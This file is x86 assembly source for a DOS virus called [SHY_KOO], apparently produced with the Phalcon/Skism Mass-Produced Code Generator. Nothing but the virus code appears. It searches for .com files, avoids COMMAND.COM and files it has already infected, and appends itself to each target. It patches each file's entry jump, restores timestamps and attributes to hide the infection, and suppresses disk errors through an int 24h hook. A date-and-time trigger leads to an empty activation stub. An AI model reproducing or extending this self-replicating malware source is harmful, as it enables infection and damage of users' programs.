; KOO.asm : [SHY_KOO] by [Walt Whittman]
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

entry_point: db 0e9h,0,0                ; jmp startvirus

startvirus:                             ; virus code starts here
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb

          mov  byte ptr [bp+numinfec],1 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

          lea  dx,[bp+com_mask]
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   done_infections          ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

checkCOM:
          mov  ax,word ptr [bp+newDTA+35] ; Get tail of filename
          cmp  ax,'DN'                  ; Ends in ND? (commaND)
          jz   find_next

          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,65535-(endheap-startvirus) ; Is it too large?
          ja   find_next

          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  dh,10                    ; Check month
          jb   exit_virus
          cmp  dl,14                    ; Check date
          jb   exit_virus
          cmp  cx,1991                  ; Check year
          jb   exit_virus
          cmp  al,0                     ; Check date of week
          jb   exit_virus

          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  ch,23                    ; Check the hour
          jb   exit_virus
          cmp  cl,59                    ; Check the minute
          jb   exit_virus
          cmp  dh,59                    ; Check the seconds
          jb   exit_virus
          cmp  dl,90                    ; Check the percentage
          jbe  activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          int  21h
          retn                          ; 100h is on stack
save3               db 0cdh,20h,0       ; First 3 bytes of COM file

activate:                               ; Conditions satisfied
; Insert your activation code here
          jmp  exit_virus

creator             db '[MPC]',0        ; Mass Produced Code Generator
virusname           db '[SHY_KOO]',0
author              db '[Walt Whittman]',0

infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Concatenate virus
          lea  dx,[bp+startvirus]
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

com_mask            db '*.com',0
heap:                                   ; Variables not in code
oldint24            dd ?                ; Storage for old int 24h handler      
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point
